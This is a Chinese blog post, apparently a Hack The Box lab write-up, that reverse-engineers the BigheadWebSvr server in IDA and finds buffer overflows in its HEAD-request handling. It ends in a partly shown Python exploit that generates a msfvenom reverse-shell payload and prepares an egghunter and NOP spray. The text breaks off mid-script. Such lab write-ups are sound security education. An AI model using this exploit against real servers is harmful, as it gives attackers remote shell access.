@@ -1,0 +1,595 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="本文专门记录hack the box — bighead机器的BigheadWebSvr逆向部分，故前面的部分省略，part2主要使用的工具是ida。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box[BigheadWebSvr逆向-part-2]">
+<meta property="og:url" content="https://fdlucifer.github.io/2020/12/30/hack-the-box-bigheadwebsvr-2/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="本文专门记录hack the box — bighead机器的BigheadWebSvr逆向部分，故前面的部分省略，part2主要使用的工具是ida。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida10.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida11.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida12.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida13.jpg">
+<meta property="article:published_time" content="2020-12-30T14:19:47.000Z">
+<meta property="article:modified_time" content="2021-01-01T09:51:21.375Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2020/12/30/hack-the-box-bigheadwebsvr-2/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2020/12/30/hack-the-box-bigheadwebsvr-2/","path":"2020/12/30/hack-the-box-bigheadwebsvr-2/","title":"Hack-The-Box[BigheadWebSvr逆向-part-2]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box[BigheadWebSvr逆向-part-2] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#step1"><span class="nav-number">1.</span> <span class="nav-text">step1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step2"><span class="nav-number">2.</span> <span class="nav-text">step2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#step3"><span class="nav-number">3.</span> <span class="nav-text">step3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Final-Exploit-1-%E6%8E%A8%E8%8D%90%EF%BC%8C%E8%BE%83%E7%A8%B3%E5%AE%9A%EF%BC%8C%E5%9B%9E%E5%BC%B9shell%E6%97%B6%E9%97%B4%E8%BE%83%E7%9F%AD"><span class="nav-number">4.</span> <span class="nav-text">Final Exploit 1 (推荐，较稳定，回弹shell时间较短):</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Final-Exploit-2-%E5%9B%9E%E5%BC%B9shell%E6%97%B6%E9%97%B4%E8%BE%83%E9%95%BF"><span class="nav-number">5.</span> <span class="nav-text">Final Exploit 2 (回弹shell时间较长):</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2020/12/30/hack-the-box-bigheadwebsvr-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box[BigheadWebSvr逆向-part-2] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box[BigheadWebSvr逆向-part-2]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2020-12-30 22:19:47" itemprop="dateCreated datePublished" datetime="2020-12-30T22:19:47+08:00">2020-12-30</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2021-01-01 17:51:21" itemprop="dateModified" datetime="2021-01-01T17:51:21+08:00">2021-01-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/" itemprop="url" rel="index"><span itemprop="name">缓冲区溢出</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <ul>
+<li>本文专门记录hack the box — bighead机器的BigheadWebSvr逆向部分，故前面的部分省略，part2主要使用的工具是ida。</li>
+</ul>
+<span id="more"></span>
+
+<h3 id="step1"><a href="#step1" class="headerlink" title="step1"></a>step1</h3><ul>
+<li>寻找ConnectionHandler</li>
+</ul>
+<p>找到处理web请求的函数，因为可以与服务器交互。如果在处理命令行参数时发现了溢出，这没有用，因为无法控制它。下面的方法可以找到IDA标记为_ConnectionHandler@4的函数。</p>
+<ul>
+<li>字符串</li>
+</ul>
+<p>打开IDA后，按Shift-F12打开Strings窗口。走到一半的时候，这个区域会跳出来</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida.jpg"></li>
+</ul>
+<p>这些显然是用于解析传入的HTTP请求的字符串。这输入与服务器交互的地方，所以想从这里开始。选择GET &#x2F;coffee，因为这是第一次看到BigheadWebSrv的路径。</p>
+<p>双击它，带到字符串是在内存中，与几个其他字符串在它周围，可以看到这个字符串地址在0x004077F3:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida1.jpg"></li>
+</ul>
+<p>IDA还展示了_ConnectionHandler@4中的交叉引用(引用0x004077F3的代码)。</p>
+<p>点击aGetCoffee(它将突出显示黄色)，然后点击“x”，将得到一个弹出与这个字符串引用的代码的位置列表:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida2.jpg"></li>
+</ul>
+<p>在本例中，只有一次，所以点击OK进入代码中:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida3.jpg"></li>
+</ul>
+<p>向上滚动到函数的顶部，查看它的名称是由IDA指定的_ConnectionHandler@4。</p>
+<h3 id="step2"><a href="#step2" class="headerlink" title="step2"></a>step2</h3><p>或者，当IDA加载时，它从main启动。知道这是一个网络服务器。所以它很可能会创建一个套接字，将其绑定到post，监听，等待连接，通过分叉(在Windows中是启动一个线程)处理那些连接。看到这个函数的整体流程是这样的:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida4.jpg"></li>
+</ul>
+<p>甚至不需要查看程序集，就可以猜测发生了什么。</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida5.jpg"></li>
+</ul>
+<p>如果滚动代码本身，看看被调用的函数，发现基本上是对的。还注意到，在处理了arg之后，它会打印一条带有服务器版本的消息，并警告该软件是存在漏洞的:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida6.jpg"></li>
+</ul>
+<p>如果跳到上面的绿色部分，将看到处理连接的代码和创建一个线程来处理连接的调用:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida7.jpg"></li>
+</ul>
+<p>线程将偏移量传递给_ConnectionHander@4作为要运行的代码。</p>
+<h3 id="step3"><a href="#step3" class="headerlink" title="step3"></a>step3</h3><p>也有可能，只是看看函数窗口，看到名称IDA给出的函数，并猜测这是处理连接:</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida8.jpg"></p>
+</li>
+<li><p>处理程序逻辑</p>
+</li>
+</ul>
+<p>现在有了处理程序逻辑，尝试理解它。就像使用main一样，从函数的形状开始，看看能不能猜出发生了什么:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida9.jpg"></li>
+</ul>
+<p>立即看到一堆比较(if语句)，末尾有一堆块。猜所有这些if语句都是基于成功&#x2F;失败或recv，然后传入HTTP请求的不同属性(GET vs POST，文件存在，等等)进行分支。</p>
+<p>从顶部开始，可以快速浏览并获得逻辑。并不是试图去理解每一个配置，而只是寻找一个生成的想法，即什么是分支，什么是可以排除的有趣的东西。以下是在上面看到的流的注释版本:</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida10.jpg"></p>
+</li>
+<li><p>(a)设置两个缓冲区并将其设置为0。如果某个错误代码为-1，则打印(b)处的错误并返回(c)处的错误。</p>
+</li>
+<li><p>(d)检查最后一个memset返回ok，否则返回(c)。</p>
+</li>
+<li><p>(e)在第一个缓冲区中recv到0x20c(524)字节，并检查返回代码。如果0或错误(负)，跳转到(f)。在(f)，如果recv返回0，转到(g)，打印“连接关闭”，关闭套接字，并转到(c)返回。否则，转到(h)，打印接收错误值，关闭套接字，然后转到(c)返回。</p>
+</li>
+<li><p>检查在(i)处接收的数据的长度。如果它小于0xdb(219)字节，转到(j)，否则转到(k)。</p>
+</li>
+<li><p>在(j)处，检查请求的前五个字节是否为“HEAD”。如果是这样，请进入用绿色标记的部分。否则，转到(k)。</p>
+</li>
+<li><p>在(k)，现在处理所有的请求，除了一个低于219字节的头，检查请求以6个字节开始，“GET &#x2F;”(在“&#x2F;”后面有空格)。如果是这样，转到(l)，发送带有拿着饮料的人的图像的响应，清理干净，然后返回到(c)。否则，转到(m)。</p>
+</li>
+<li><p>在(m)处，检查请求是否以“GET &#x2F;coffee”开始。如果匹配，将418响应与teapot gif发送到(n)，然后清理并返回到(c)。这就解释了为什么dirsearch为&#x2F;coffee、&#x2F;coffeecat、&#x2F;coffeebreak和&#x2F;coffeecup返回相同的结果。否则，转到(o)。</p>
+</li>
+<li><p>在(o)处，检查申请是否以“POST &#x2F;”开头。如果是这样，转到(p)和(l)完全一样，发送给那个带着饮料图像的人。否则，转到(q)并发送404消息，清除，并返回到(c)。</p>
+</li>
+</ul>
+<p>很快，就排除了上述流程中的任何风险。</p>
+<ul>
+<li>短head请求</li>
+</ul>
+<p>其余的代码(上面绿色的部分)在HEAD请求长度小于219字节时调用。只是浏览一下，试图从更高的层面了解它在做什么:</p>
+<ul>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida11.jpg"></p>
+</li>
+<li><p>在(a)处，从原始初始化开始的第二个缓冲区的三个字节被设置为0。然后，创建一个新的12字节缓冲区。最后，初始化两个计数器(EBP-C和EPB-10)。把它们称为I和j I被设为6，而j为0。</p>
+</li>
+<li><p>现在在(b)中，它是循环的顶部。进入请求的字节i字节将被加载，如果为空，循环将跳转到(e)。否则，继续跳转到(c)，其中i+1字节进入请求，如果为空，循环跳转到(e)。否则，继续跳转到(d)。</p>
+</li>
+<li><p>(d)有一堆事情:</p>
+</li>
+<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida12.jpg"></p>
+</li>
+</ul>
+<p>因此，它将每两个字节从十六进制转换为一个字节值，并将其存储在堆的缓冲区中。然后它回到这个局部循环的顶部。</p>
+<ul>
+<li><p>这里有一个堆溢出，因为可以写远超过错误定位的12字节。检查这个循环完成后会发生什么，在(e)中。</p>
+</li>
+<li><p>首先，它调用_Function4，将新的未十六进制数组作为参数传递。然后它向guy和drink图像发送相同的200 OK，并向控制台打印一些消息。然后转到(f)，检查发送的返回代码。如果-1(错误)，它转到(g)，打印更多错误，清理并返回。否则，它将返回循环的顶部并尝试读取更多内容。</p>
+</li>
+</ul>
+<p>快速浏览Function4:</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bigheadida13.jpg"></li>
+</ul>
+<p>基本上是从I控制的缓冲区执行一个不安全的strcpy到堆栈上的一个地址。这是一个覆盖函数返回指针溢出的明显例子，但现在可以避免堆溢出。</p>
+<h3 id="Final-Exploit-1-推荐，较稳定，回弹shell时间较短"><a href="#Final-Exploit-1-推荐，较稳定，回弹shell时间较短" class="headerlink" title="Final Exploit 1 (推荐，较稳定，回弹shell时间较短):"></a>Final Exploit 1 (推荐，较稳定，回弹shell时间较短):</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import subprocess</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">from time import <span class="built_in">sleep</span></span><br><span class="line"></span><br><span class="line">context(terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;new-window&#x27;</span>])</span><br><span class="line">context(os=<span class="string">&#x27;windows&#x27;</span>, <span class="built_in">arch</span>=<span class="string">&quot;i386&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def clean_and_exit(msg, files):</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        try:</span><br><span class="line">            os.remove(f)</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != 5:</span><br><span class="line">    clean_and_exit(<span class="string">&quot;%s [target] [target port] [callback ip] [callback port]&quot;</span> % (sys.argv[0]), [])</span><br><span class="line"></span><br><span class="line">target = sys.argv[1]</span><br><span class="line">port = sys.argv[2]</span><br><span class="line">cb_ip = sys.argv[3]</span><br><span class="line">cb_port = sys.argv[4]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate Shellcode </span></span><br><span class="line">msfvenom_string = <span class="string">&#x27;msfvenom -p windows/shell_reverse_tcp LHOST=%s LPORT=%s EXIT_FUNC=THREAD -a x86 --platform windows -b &quot;\\x00\\x0a\\x0d&quot; -f python -v shellcode -o sc.py&#x27;</span> % (cb_ip, cb_port)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Generating shellcode:\n    %s&quot;</span> % msfvenom_string)</span><br><span class="line">p = subprocess.Popen(msfvenom_string.split(<span class="string">&#x27; &#x27;</span>), stdout=subprocess.PIPE, stderr=subprocess.PIPE)</span><br><span class="line">out, err = p.communicate()</span><br><span class="line"></span><br><span class="line">try:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Error&quot;</span> <span class="keyword">in</span> err:</span><br><span class="line">        raise Exception(<span class="string">&quot;[-] Unable to generate shellcode\n    %s&quot;</span> % err)</span><br><span class="line">    from sc import shellcode</span><br><span class="line">except (NameError, Exception) as e:</span><br><span class="line">    clean_and_exit(e.message, [<span class="string">&#x27;sc.py&#x27;</span>, <span class="string">&#x27;sc.pyc&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] Shellcode generated successfully&quot;</span></span><br><span class="line">os.remove(<span class="string">&#x27;sc.py&#x27;</span>)</span><br><span class="line">os.remove(<span class="string">&#x27;sc.pyc&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># !mona egg -t</span></span><br><span class="line">egg = <span class="string">&#x27;luci&#x27;</span></span><br><span class="line">egghunter = <span class="string">&quot;6681caff0f42526a0258cd2e3c055a74efb8&quot;</span> + egg.encode(<span class="string">&#x27;hex&#x27;</span>) + <span class="string">&quot;8bfaaf75eaaf75e7ffe7&quot;</span></span><br><span class="line"></span><br><span class="line">nops = <span class="string">&quot;\x90&quot;</span>*16</span><br><span class="line">spray = egg + egg + nops + 